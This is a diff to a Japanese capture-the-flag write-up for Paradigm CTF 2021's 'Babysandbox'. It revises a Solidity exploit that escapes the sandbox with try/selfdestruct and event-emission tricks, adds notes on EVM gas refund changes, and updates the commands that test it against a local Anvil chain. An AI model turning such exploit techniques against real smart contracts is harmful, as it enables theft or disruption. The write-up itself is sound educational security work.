@@ -78,7 +78,8 @@ try文の式には外部関数コールとコントラクト作成のみ指定�
 ```solidity
 contract StateChange {
     uint a = 0;
-    function f() external {
+
+    function change() external {
         a++;
     }
 }
@@ -100,7 +101,8 @@ contract BabysandboxExploit {
 ```
 
 しかし、これは`OutOfGas`になる。callの`0x4000` (`16384`) gasの制限に引っかかるためである。
-これに対処するには`StateChange`の変数を無くし、`selfdestruct`にすると良い。`selfdestruct`を使うことで使えるgasが増える。関連: [EIP-2200: Structured Definitions for Net Gas Metering ](https://eips.ethereum.org/EIPS/eip-2200), [EIP-3298: Removal of refunds](https://eips.ethereum.org/EIPS/eip-3298)。
+関数`change`の実行に20000 gasほどかかる。
+これに対処するには`StateChange`の変数を無くし、`selfdestruct`やログの発火に変えると良い。それぞれ関数`change`の実行が7704 gasと890 gasになる。
 最終的なexploitは以下。
 
 ```Solidity
@@ -108,8 +110,10 @@ contract BabysandboxExploit {
 pragma solidity ^0.8.13;
 
 contract StateChange {
-    function f() external {
-        selfdestruct(payable(address(0)));
+    event changed();
+
+    function change() external {
+        emit changed();
     }
 }
 
@@ -121,12 +125,25 @@ contract BabysandboxExploit {
     }
 
     fallback() external {
-        try stateChange.f() {
+        try stateChange.change() {
             selfdestruct(payable(address(0)));
         } catch {}
     }
 }
 ```
+
+### 余談: `selfdestruct`のガス払い戻しの廃止
+
+Paradigm CTF 2021が開催された2021年2月頃は、EVMのバージョンがMuir Glacierだった。
+この時点では、`selfdestruct`はさらにガスを節約できた。
+
+2022年8月現在はGray Glacierであるが、2021年8月のLondonハードフォークでEIP-3529により`selfdestruct`のガス払い戻しが廃止された。
+
+関連リソース
+- [EIP-2200: Structured Definitions for Net Gas Metering](https://eips.ethereum.org/EIPS/eip-2200)
+- [EIP-3298: Removal of refunds](https://eips.ethereum.org/EIPS/eip-3298)
+- [EIP-3403: Partial removal of refunds](https://eips.ethereum.org/EIPS/eip-3403)
+- [EIP-3529: Reduction in refunds](https://eips.ethereum.org/EIPS/eip-3529) (status: final)
 
 ## Test
 
@@ -151,16 +168,36 @@ export PRIVATE_KEY_PLAYER=59c6995e998f97a5a0044966f0945389dc9e86dae88c7a8412f460
 
 次にAnvilを起動する。
 ```sh
-anvil --silent 1>/dev/null &
+anvil --hardfork Istanbul --silent 1>/dev/null &
 sleep 1
 ```
 `sleep`は使いたくないが、これを挟んでAnvilが完全に起動するまで待たないと次に実行する`forge script`でRPCのエラーが起きる。
 
+EVMのバージョンを`MuirGlacier`ではなく`Istanbul`にしているのは、FoundryがMuir Glacierの指定に対応しておらず、`forge script`実行時に`Spec Not supported`のパニックが起きるからである（下記参照）。
+
+```rs
+pub fn evm_inner<'a, DB: Database, const INSPECT: bool>(
+    env: &'a mut Env,
+    db: &'a mut DB,
+    insp: &'a mut dyn Inspector<DB>,
+) -> Box<dyn Transact + 'a> {
+    match env.cfg.spec_id {
+        SpecId::LATEST => create_evm!(LatestSpec, db, env, insp),
+        SpecId::MERGE => create_evm!(MergeSpec, db, env, insp),
+        SpecId::LONDON => create_evm!(LondonSpec, db, env, insp),
+        SpecId::BERLIN => create_evm!(BerlinSpec, db, env, insp),
+        SpecId::ISTANBUL => create_evm!(IstanbulSpec, db, env, insp),
+        SpecId::BYZANTIUM => create_evm!(ByzantiumSpec, db, env, insp),
+        _ => panic!("Spec Not supported"),
+    }
+}
+```
+
 scriptを実行する。
 ```sh
-forge script BabysandboxExploitTestScript --fork-url $RPC_ANVIL --broadcast --private-keys $PRIVATE_KEY_SETUP --private-keys $PRIVATE_KEY_PLAYER --gas-limit 1000000 --gas-estimate-multiplier 200 -vvvvv
+forge script BabysandboxExploitTestScript --fork-url $RPC_ANVIL --broadcast --private-keys $PRIVATE_KEY_SETUP --private-keys $PRIVATE_KEY_PLAYER --gas-limit 30000000 --gas-estimate-multiplier 200 -vvvvv --legacy
 ```
-現在、Forgeのscriptで個別のトランザクションにgasを指定する方法が存在しないため、`--gas-estimate-multiplier 200`を指定する必要がある。関連: https://github.com/foundry-rs/foundry/issues/2627 。
+現在、Forgeのscriptで個別のトランザクションにgasを指定する方法が存在しないため、`--gas-estimate-multiplier 200`を指定する必要がある。関連: https://github.com/foundry-rs/foundry/issues/2627 。また当時はトランザクション手数料マーケットがLondonハードフォークで導入されたEIP-1559ではないため`--legacy`オプションをつける。
 
 
 解けたかどうか`cast call`で確認する。
